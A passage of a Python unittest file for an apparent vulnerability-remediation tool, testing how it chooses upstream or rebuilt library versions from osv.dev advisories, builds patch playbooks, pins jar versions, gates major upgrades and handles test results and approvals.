        self.assertEqual(len(calls), 1)                                       # the second open is cached


class Feedback(unittest.TestCase):
    def test_live_history_records_go_to_the_store(self):
        d = tempfile.mkdtemp()
        added = []
        demo(APPV2_STATE_DIR=d, APP_VECTOR_DB_ID='vs_apps')
        appv2.configure(demo_mode=lambda: False, rag_add=lambda store, path: added.append((store, path.name)))
        st = {'run_id': 'r9', 'event': dict(appv2.DEMO_EVENTS[0]), 'hosts': [
            {'app': 'workflow-engine', 'host': 'node1', 'site': 'lab', 'env': 'qa', 'outcome': 'patched'},
            {'app': 'workflow-engine', 'host': 'node2', 'site': 'edge-site-1', 'env': 'prod', 'outcome': 'skipped'}]}
        out = appv2.feed_history(st)
        self.assertEqual(out['records'], 1)
        self.assertEqual([s for s, _ in added], ['vs_apps'])
        self.assertIn('workflow-engine-lab-mina-core-PATCHED', added[0][1])
        self.assertIn('Site: lab', next((Path(d) / 'app-history').glob('*.md')).read_text())



def with_osv():
    """Demo mode with osv.dev on, answered from lightwell/demo/osv.json (the scanner's saved answers)."""
    sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'lightwell'))
    from scanner.osv import FixtureOsv
    fx = FixtureOsv(Path(__file__).resolve().parents[1] / 'lightwell' / 'demo' / 'osv.json')
    demo(APPV2_OSV='true')
    appv2.configure(osv_lookup=lambda q: fx.lookup([types.SimpleNamespace(ecosystem=e, name=n, version=v) for e, n, v in q]))


def wait_for(statuses, timeout=5):
    end = time.time() + timeout
    while time.time() < end:
        if appv2.state().get('status') in statuses:
            return appv2.state()
        time.sleep(0.02)
    raise AssertionError(f"stuck at {appv2.state().get('status')}")


class Extras(unittest.TestCase):
    def rows(self, event_id='evt-zookeeper'):
        appv2.start_assess(event_id)
        return {r['id']: r for r in wait_for({'assessed'})['impact']['extra']['rows']}

    def test_off_by_default(self):
        demo()
        appv2.start_assess('evt-zookeeper')
        self.assertNotIn('extra', wait_for({'assessed'})['impact'])

    def test_upstream_on_the_same_line(self):
        with_osv()
        r = self.rows()['inventory-service|org.apache.mina:mina-core']
        self.assertEqual((r['kind'], r['to'], r['selectable']), ('upstream', '2.1.13', True))
        self.assertEqual(len(r['advisories']), 6)
        self.assertIn('2.1 line', r['reasoning'])

    def test_lightwell_build_of_a_newer_version_is_a_second_option(self):
        with_osv()
        r = self.rows()['inventory-service|org.apache.mina:mina-core']
        self.assertEqual([(o['source'], o['to'], o['version_change']) for o in r['options']],
                         [('upstream', '2.1.13', False), ('lightwell', '2.2.5.rhlw-00002', True)])
        self.assertEqual(r['default'], 0)                 # a patch release on the same minor line wins by default
        self.assertEqual(r['options'][1]['cves'], ['CVE-2026-41635'])

    def test_other_version_of_the_fix_library_gets_options_not_still_open(self):
        with_osv()
        rows = self.rows('evt-mina-core')
        self.assertEqual(rows['workflow-engine|org.apache.mina:mina-core']['kind'], 'residual')
        r = rows['inventory-service|org.apache.mina:mina-core']
        self.assertTrue(r['selectable'])
        self.assertEqual([o['to'] for o in r['options']], ['2.1.13', '2.2.5.rhlw-00002'])
        appv2.start_generate(['inventory-service|lab'], ['inventory-service|org.apache.mina:mina-core'])
        changes = wait_for({'generated'})['playbooks'][0]['changes']
        self.assertEqual([(c['artifact'], c['to']) for c in changes], [('mina-core', '2.1.13')])   # one change per library

    def test_lightwell_build_preferred_and_its_cves_removed(self):
        with_osv()
        r = self.rows()['workflow-engine|org.springframework.security:spring-security-web']
        self.assertEqual((r['kind'], r['to']), ('lightwell', '5.7.11.rhlw-00006'))
        self.assertEqual(sorted(r['lightwell_covers']), ['CVE-2024-38821', 'CVE-2026-22732'])
        self.assertNotIn('CVE-2024-38821', [a['id'] for a in r['advisories']])   # fixed by Lightwell: not "open"

    def test_the_events_own_package_is_information_only(self):
        with_osv()
        r = self.rows('evt-mina-core')['workflow-engine|org.apache.mina:mina-core']
        self.assertEqual((r['kind'], r['selectable'], r['to']), ('residual', False, '2.2.8'))
        self.assertNotIn('CVE-2026-41635', [a['id'] for a in r['advisories']])

    def test_major_upgrade_is_listed_not_offered(self):
        with_osv()
        bom = [{'app': 'a', 'servers': [{'host': 'h', 'env': 'qa'}], 'dependencies': [
            {'group': 'org.apache.zookeeper', 'artifact': 'zookeeper', 'version': '3.5.9'},
            {'group': 'org.springframework.security', 'artifact': 'spring-security-web', 'version': '5.7.11'}]}]
        appv2.configure(lightwell_get=None)
        ev = next(e for e in appv2.DEMO_EVENTS if e['artifact'] == 'zookeeper')
        imp = appv2.impact(ev, bom)
        real = appv2._lightwell_builds
        appv2._lightwell_builds = lambda: {}          # as if Lightwell had no spring-security build
        try:
            rows = {r['artifact']: r for r in appv2.extras(ev, imp, bom)['rows']}
        finally:
            appv2._lightwell_builds = real
        self.assertEqual((rows['spring-security-web']['kind'], rows['spring-security-web']['selectable']), ('major', False))

    def test_osv_down_leaves_the_run_alone(self):
        with_osv()
        appv2.configure(osv_lookup=lambda q: (_ for _ in ()).throw(OSError('osv.dev unreachable')))
        appv2.start_assess('evt-zookeeper')
        st = wait_for({'assessed'})
        self.assertEqual(st['impact']['extra']['rows'], [])
        self.assertIn('unreachable', st['impact']['extra']['error'])


class MultiJar(unittest.TestCase):
    def setUp(self):
        with_osv()
        appv2.start_assess('evt-zookeeper'); wait_for({'assessed'})

    def test_selected_extra_joins_that_apps_playbook_only(self):
        self.assertEqual(appv2.start_generate(None, ['inventory-service|org.apache.mina:mina-core', 'not|offered'])[0], 200)
        st = wait_for({'generated'})
        pbs = {p['app']: p for p in st['playbooks']}
        self.assertEqual([(c['artifact'], c['source']) for c in pbs['inventory-service']['changes']],
                         [('zookeeper', 'lightwell'), ('mina-core', 'upstream')])
        self.assertEqual(len(pbs['workflow-engine']['changes']), 1)
        text = pbs['inventory-service']['text']
        self.assertIn('new_jar: mina-core-2.1.13.jar', text)
        self.assertIn('/maven2/org/apache/mina/mina-core/2.1.13/', text)        # upstream, not the Lightwell repo
        self.assertTrue(all(c['ok'] for c in appv2.check_playbook(text, text)))
        self.assertEqual(st['extra_selected'], ['inventory-service|org.apache.mina:mina-core'])

    def test_the_chosen_option_decides_the_jar(self):
        appv2.start_generate(None, ['inventory-service|org.apache.mina:mina-core::1', 'inventory-service|org.apache.mina:mina-core::9'])
        st = wait_for({'generated'})
        self.assertEqual(st['extra_selected'], ['inventory-service|org.apache.mina:mina-core::1'])   # ::9 does not exist
        c = next(p for p in st['playbooks'] if p['app'] == 'inventory-service')['changes'][1]
        self.assertEqual((c['source'], c['to'], c['version_change']), ('lightwell', '2.2.5.rhlw-00002', True))
        self.assertIn('/lightwell-remediated/org/apache/mina/mina-core/2.2.5.rhlw-00002/', c['url'])
        self.assertTrue(c['provenance_url'].endswith('.provenance.sigstore.json'))

    def test_extra_for_an_unselected_app_is_dropped(self):
        appv2.start_generate(['workflow-engine|lab'], ['inventory-service|org.apache.mina:mina-core'])
        st = wait_for({'generated'})
        self.assertEqual(st['extra_selected'], [])
        self.assertEqual([p['app'] for p in st['playbooks']], ['workflow-engine'])

    def test_a_moved_swap_fails_the_pin(self):
        appv2.start_generate(None, ['inventory-service|org.apache.mina:mina-core'])
        text = next(p for p in wait_for({'generated'})['playbooks'] if p['app'] == 'inventory-service')['text']
        bad = text.replace('new_jar: mina-core-2.1.13.jar', 'new_jar: mina-core-9.9.9.jar')
        self.assertFalse({c['id']: c['ok'] for c in appv2.check_playbook(bad, text)}['pinned'])

    def test_test_inputs_cover_every_jar(self):
        appv2.start_generate(None, ['inventory-service|org.apache.mina:mina-core'])
        pb = next(p for p in wait_for({'generated'})['playbooks'] if p['app'] == 'inventory-service')
        t = appv2.test_inputs('inventory-service', pb['changes'])
        lib = {x['artifact']: x for x in json.loads(t['lib_json'])}
        self.assertEqual(set(lib), {'postgresql', 'zookeeper', 'mina-core'})
        self.assertTrue(lib['mina-core']['changed'] and lib['zookeeper']['changed'])
        self.assertFalse(lib['postgresql']['changed'])
        self.assertEqual(json.loads(t['expect_json']), {'zookeeper': 'zookeeper-3.5.9.rhlw-00001.jar',
                                                        'mina-core': 'mina-core-2.1.13.jar'})
        self.assertIn('mina-core=org.apache.mina.core.session.IoSession', t['probes'])

    def test_demo_run_tests_writes_back_and_reports_both_jars(self):
        appv2.start_generate(['inventory-service|lab', 'inventory-service|core-dc-1'], ['inventory-service|org.apache.mina:mina-core'])
        wait_for({'generated'})
        appv2.start_dispatch()
        wait_for({'awaiting_approval'})
        appv2.decide('inventory-service|core-dc-1', 'approved')
        st = wait_for({'complete'})
        h = next(x for x in st['hosts'] if x['key'] == 'inventory-service|lab')
        self.assertEqual(h['steps']['test'], 'done')
        self.assertTrue(h['test']['passed'])
        self.assertEqual(json.loads(h['test']['health'])['jars']['mina-core'], 'mina-core-2.1.13.jar')
        self.assertIn('mina-core-2.1.13.jar', h['detail'])
        self.assertEqual(appv2._BOM_UPDATES['inventory-service|org.apache.mina:mina-core'], '2.1.13')
        self.assertEqual(appv2._BOM_UPDATES['inventory-service|org.apache.zookeeper:zookeeper'], '3.5.9.rhlw-00001')
        self.assertTrue((Path(appv2.reports_dir()) / st['report']['file']).exists())


class LiveTestNode(unittest.TestCase):
    """The live follow reading the test_in_pod node: its evidence, and a failed test stopping the site."""

    def run_with(self, test_status, artifacts):
        demo()
        appv2.time = types.SimpleNamespace(sleep=lambda s: None, time=time.time)

        def ao(path, method='GET', body=None):
            if path == '/api/v1/workflows':
                return {'resources': [{'id': 'wf1', 'name': 'App Patch v2'}]}
            if path == '/api/v1/executions' and method == 'POST':
                ao.inputs = body['input_data']
                return {'id': 'ex1'}
            if path == '/api/v1/executions/ex1':
                return {'status': 'failed' if test_status == 'failed' else 'completed', 'error_details': 'job failed'}
            if path == '/api/v1/executions/ex1/activities':
                acts = [{'temporal_activity_id': 'commit_to_gitea', 'status': 'completed', 'started_at': 't',
                         'output_data': {'artifacts': {'commit_sha': 'abc', 'provenance_verified': True}}},
                        {'temporal_activity_id': 'test_in_pod', 'status': test_status, 'started_at': 't',
                         'output_data': {'artifacts': artifacts}}]
                if test_status != 'failed':
                    acts.append({'temporal_activity_id': 'run_app_patch', 'status': 'completed', 'started_at': 't',
                                 'output_data': {'artifacts': {'patched': True, 'version': 'x.jar'}}})
                return {'resources': acts}
            raise AssertionError(path)
        appv2.configure(demo_mode=lambda: False, ao_call=ao)
        appv2.EVENTS = appv2.EventStore(None)
        ev = dict(appv2.DEMO_EVENTS[0])
        target = {'key': 'workflow-engine|node1', 'app': 'workflow-engine', 'host': 'node1', 'env': 'qa',
                  'installed': '2.2.5', 'path': '/opt/apps/workflow-engine', 'service': 'workflow-engine',
                  'health_url': 'http://localhost:8090/health'}
        with appv2._LOCK:
            appv2._RUN.clear()
            appv2._RUN.update(status='generated', run_id='r1', event=ev, events=[],
                              stages={k: 'pending' for k in appv2.STAGES},
                              impact={'targets': [target], 'apps': ['workflow-engine'], 'other': []},
                              playbooks=[{'app': 'workflow-engine', 'filename': 'app-v2/n.yml', 'text': 'x',
                                          'sha256': '0' * 64, 'ok': True,
                                          'changes': [appv2.change_for_event(ev, target)]}])
        try:
            appv2.start_dispatch()
            for _ in range(300):
                if appv2.state().get('status') == 'complete':
                    break
                time.sleep(0.01)
            return appv2.state(), ao.inputs
        finally:
            appv2.time = time

    def test_evidence_is_kept(self):
        st, inputs = self.run_with('completed', {'pipelinerun': 'app-v2-n-r1', 'test_passed': 'True', 'osv_open': 5,
                                                 'test_health': {'status': 'UP', 'jars': {'mina-core': 'm.jar'}}})
        h = st['hosts'][0]
        self.assertEqual((h['outcome'], h['steps']['test']), ('patched', 'done'))
        self.assertEqual((h['test']['pipelinerun'], h['test']['passed'], h['test']['osv_open']), ('app-v2-n-r1', True, '5'))
        self.assertEqual(json.loads(h['test']['health'])['jars']['mina-core'], 'm.jar')   # parsed by AO: kept as text
        self.assertEqual(json.loads(inputs['jars_json'])[0]['new_jar'], 'mina-core-2.2.5.rhlw-00002.jar')
        self.assertIn('lib_json', inputs)
        self.assertEqual(inputs['port'], '8090')

    def test_failed_test_stops_the_site(self):
        st, _ = self.run_with('failed', {'pipelinerun': 'app-v2-n-r1', 'test_passed': 'False',
                                         'test_reason': 'mina-core reported missing'})
        h = st['hosts'][0]
        self.assertEqual((h['outcome'], h['steps']['test']), ('failed', 'failed'))
        self.assertIn('no site was touched', h['detail'])
        self.assertIn('mina-core reported missing', h['detail'])



class PlanAFix(unittest.TestCase):
    def setUp(self):
        with_osv()

    def pick(self, plan):
        return {r['artifact']: (r['to'], r['chosen']) for r in plan['changes']}

    def test_source_precedence(self):
        lw = appv2.app_plan('inventory-service', ['lightwell'])
        self.assertNotIn('mina-core', self.pick(lw))
        self.assertIn('Lightwell with Another Build', lw['not_fixable'][0]['why'])
        self.assertEqual(self.pick(appv2.app_plan('inventory-service', ['lightwell', 'another']))['mina-core'],
                         ('2.2.5.rhlw-00002', 'another'))
        self.assertEqual(self.pick(appv2.app_plan('inventory-service', ['osv']))['mina-core'], ('2.1.13', 'osv'))

    def test_major_gate(self):
        no = appv2.app_plan('workflow-engine', ['osv'])
        self.assertNotIn('spring-security-web', self.pick(no))
        self.assertIn('major', next(r for r in no['not_fixable'] if r['artifact'] == 'spring-security-web')['why'])
        self.assertEqual(self.pick(appv2.app_plan('workflow-engine', ['osv'], True))['spring-security-web'][0], '6.5.11')

    def test_selection_and_override(self):
        p = appv2.app_plan('inventory-service', ['lightwell', 'another', 'osv'], False,
                           [{'id': 'inventory-service|org.apache.mina:mina-core', 'source': 'osv'}])
        self.assertEqual(self.pick(p), {'mina-core': ('2.1.13', 'osv')})
        self.assertEqual(sorted(r['artifact'] for r in p['left_out']), ['postgresql', 'zookeeper'])
        self.assertIn('/maven-central/org/apache/mina/mina-core/2.1.13/', p['changes'][0]['change']['url']
                      .replace('/maven2/', '/maven-central/'))
        md = appv2.plan_markdown(p)
        for section in ('# Remediation plan: inventory-service', '## Summary', '## Changes', '## Rollout',
                        '## Repository setup', '## Left out of this plan', '## Draft change (dry run)'):
            self.assertIn(section, md)
        self.assertIn('- 1 need an upgrade to the version shown', md)

    def test_download_mapping_matches_the_run(self):
        # The Change list sends run options (lightwell / upstream); the download maps them to plan sources
        # (lightwell / another / osv). Both must name the same jars.
        appv2.start_assess('evt-zookeeper'); wait_for({'assessed'})
        appv2.start_generate(['inventory-service|lab'], ['inventory-service|org.apache.mina:mina-core'])
        jars = [c['new_jar'] for c in wait_for({'generated'})['playbooks'][0]['changes']]
        p = appv2.app_plan('inventory-service', ['lightwell', 'another', 'osv'], False,
                           [{'id': 'inventory-service|org.apache.zookeeper:zookeeper', 'source': 'lightwell'},
                            {'id': 'inventory-service|org.apache.mina:mina-core', 'source': 'osv'}])
        self.assertEqual(sorted(r['change']['new_jar'] for r in p['changes']), sorted(jars))

    def test_major_option_needs_allow_major(self):
        bom = [{'app': 'a', 'path': '/opt/apps/a', 'health_url': 'http://localhost:1/health',
                'servers': [{'host': 'h', 'site': 'lab', 'env': 'qa'}], 'dependencies': [
                    {'group': 'org.apache.zookeeper', 'artifact': 'zookeeper', 'version': '3.5.9'},
                    {'group': 'org.springframework.security', 'artifact': 'spring-security-web', 'version': '5.7.11'}]}]
        real_bom, real_lw = appv2.load_bom, appv2._lightwell_builds
        appv2.load_bom = lambda: bom
        appv2._lightwell_builds = lambda: {}          # no Lightwell spring-security build: only the major fix is left
        try:
            appv2.start_assess('evt-zookeeper'); st = wait_for({'assessed'})
            row = next(r for r in st['impact']['extra']['rows'] if r['artifact'] == 'spring-security-web')
            self.assertEqual((row['kind'], row['options'][0]['to'], row['options'][0]['major']), ('major', '6.5.11', True))
            rid = row['id']
            appv2.start_generate(None, [rid])
            self.assertEqual(wait_for({'generated'})['extra_selected'], [])          # refused without allow_major
            appv2.reset(); with_osv(); appv2.load_bom = lambda: bom; appv2._lightwell_builds = lambda: {}
            appv2.start_assess('evt-zookeeper'); wait_for({'assessed'})
            appv2.start_generate(None, [rid], allow_major=True)
            st = wait_for({'generated'})
            self.assertEqual(st['extra_selected'], [rid])
            self.assertIn('spring-security-web-6.5.11.jar', [c['new_jar'] for c in st['playbooks'][0]['changes']])
        finally:
            appv2.load_bom, appv2._lightwell_builds = real_bom, real_lw


if __name__ == '__main__':
    unittest.main()
